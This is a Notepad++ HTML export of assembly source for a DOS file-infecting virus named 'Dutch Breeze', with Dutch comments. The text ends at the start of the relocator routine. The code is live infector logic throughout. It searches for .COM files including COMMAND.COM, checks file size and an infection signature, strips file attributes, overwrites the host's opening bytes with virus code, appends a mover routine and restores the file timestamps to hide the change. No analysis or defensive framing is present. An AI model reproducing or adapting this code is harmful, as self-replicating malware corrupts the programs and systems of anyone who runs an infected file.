<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³                      Dutche Breeze by Glenn Benton                          ³</span><span class="sc0">
</span><span class="sc1">;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;³ This will be a Parasytic Non-Resident .COM infector.                        ³</span><span class="sc0">
</span><span class="sc1">;³ It will also infect COMMAND.COM.                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">

</span><span class="sc9">Public</span><span class="sc0">          </span><span class="sc5">VirLen</span><span class="sc4">,</span><span class="sc5">MovLen</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">            </span><span class="sc9">Segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'Code'</span><span class="sc0">
</span><span class="sc9">Assume</span><span class="sc0">          </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">

        </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">Signature</span><span class="sc0">       </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">0CaDah</span><span class="sc0">      </span><span class="sc1">; Signature of virus is ABCD!</span><span class="sc0">

</span><span class="sc5">Buff1</span><span class="sc0">           </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">0F100h</span><span class="sc0">
</span><span class="sc5">Buff2</span><span class="sc0">           </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">Buff1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">VirLen</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Einde</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
</span><span class="sc5">MovLen</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Einde</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mover</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">
</span><span class="sc5">Proggie</span><span class="sc0">         </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc0">
</span><span class="sc5">Lenny</span><span class="sc0">           </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc0">

</span><span class="sc5">MinLen</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">Virlen</span><span class="sc0">   </span><span class="sc1">;Minimale lengte te besmetten programma</span><span class="sc0">
</span><span class="sc5">MaxLen</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">0EF00h</span><span class="sc0">      </span><span class="sc1">; Maximale lengte te besmetten programma</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This part will contain the actual virus code, for searching the</span><span class="sc0">
</span><span class="sc1">; next victim and infection of it.</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">Begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc9">Short</span><span class="sc0"> </span><span class="sc5">OverSig</span><span class="sc0">       </span><span class="sc1">; Sprong naar Oversig vanwege kenmerk</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc5">Signature</span><span class="sc0">            </span><span class="sc1">; Herkenningsteken virus</span><span class="sc0">
</span><span class="sc5">Oversig</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Pushf</span><span class="sc0">                   </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">; Alle registers opslaan voor</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                 </span><span class="sc1">; later gebruik van het programma</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">InfectPart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Sprong</span><span class="sc0">           </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Buf1</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Spronggegevens bewaren om</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">Source</span><span class="sc0">           </span><span class="sc1">; besmette programma te starten</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Buf2</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">             </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">              </span><span class="sc1">; DTA area instellen op</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">DTA</span><span class="sc0">              </span><span class="sc1">; $DTA area</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">Vindeerst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">              </span><span class="sc1">; Zoeken naar 1e .COM file in directory</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FindPath</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">KijkInfected</span><span class="sc0">        </span><span class="sc1">; Geen gevonden, goto Afgelopen</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Afgelopen</span><span class="sc0">           </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">KijkInfected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc5">Lenny</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">MinLen</span><span class="sc0">           </span><span class="sc1">; Kijken of programmalengte voldoet</span><span class="sc0">
        </span><span class="sc6">Jb</span><span class="sc0">  </span><span class="sc5">ZoekNext</span><span class="sc0">            </span><span class="sc1">; aan de eisen van het virus</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">MaxLen</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Ja</span><span class="sc0">  </span><span class="sc5">ZoekNext</span><span class="sc0">            </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">On2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">              </span><span class="sc1">; Zo ja , file openen en file handle</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; opslaan</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Proggie</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">FH</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">; Lezen 1e 4 bytes van een file met</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; een mogelijk kenmerk van het virus</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Buff1</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">Sluiten</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">; File weer sluiten</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Buff2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Vergelijken inhoud lokatie Buff1+2</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Signature</span><span class="sc0">        </span><span class="sc1">; met Signature. Niet gelijk : Zoeken op</span><span class="sc0">
        </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">              </span><span class="sc1">; morgoth virus. Als bestand al besmet</span><span class="sc0">
</span><span class="sc5">ZoekNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">              </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Zoeken naar volgende .COM file</span><span class="sc0">
        </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">KijkInfected</span><span class="sc0">        </span><span class="sc1">; Geen gevonden, goto Afgelopen</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Afgelopen</span><span class="sc0">           </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'Dutch [Breeze] by Glenn Benton'</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Proggie</span><span class="sc0">          </span><span class="sc1">; beveiliging weghalen</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">              </span><span class="sc1">; Bestand openen</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Proggie</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">FH</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Opslaan op stack van</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; datum voor later gebruik</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">57H</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">; Inlezen van eerste deel van het</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; programma om later terug te</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Buff1</span><span class="sc0">            </span><span class="sc1">; kunnen plaatsen.</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">              </span><span class="sc1">; File Pointer weer naar het</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; einde van het programma</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">               </span><span class="sc1">; zetten</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">               </span><span class="sc1">; Bepalen van de variabele sprongen</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">; in het virus (move-routine)</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Sprong</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">MovLen</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Source</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">              </span><span class="sc1">; Move routine bewaren aan</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mover</span><span class="sc0">     </span><span class="sc1">; einde van file</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">MovLen</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">              </span><span class="sc1">; Eerste deel programma aan-</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">Buff1</span><span class="sc0">            </span><span class="sc1">; voegen na Move routine</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">              </span><span class="sc1">; File Pointer weer naar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; het begin van file</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">               </span><span class="sc1">; sturen</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; En programma overschrijven</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">     </span><span class="sc1">; met code van het virus</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">              </span><span class="sc1">; Datum van aangesproken file</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; weer herstellen</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">; Sluiten file</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">Afgelopen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">Buf2</span><span class="sc0">             </span><span class="sc1">; Sprongvariabelen weer</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Source</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; op normaal zetten voor</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Buf1</span><span class="sc0">             </span><span class="sc1">; de Move routine</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc5">Sprong</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">              </span><span class="sc1">; DTA adres weer op normaal</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; zetten en naar de Move</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; routine springen</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Sprong</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;------------------</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; All variables are stored in here, like filehandle, date/time,</span><span class="sc0">
</span><span class="sc1">; search path and various buffers.</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">FH</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindPath</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Buf1</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Buf2</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Sprong</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Source</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This will contain the relocator routine, located at the end of</span><span class="sc0">
</span><span class="sc1">; the ORIGINAL file. This will tranfer the 1st part of the program</span><span class="sc0">
</span><span class="sc1">; to it's original place.</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">Mover</span><span class="sc4">:</span><span class="sc0">
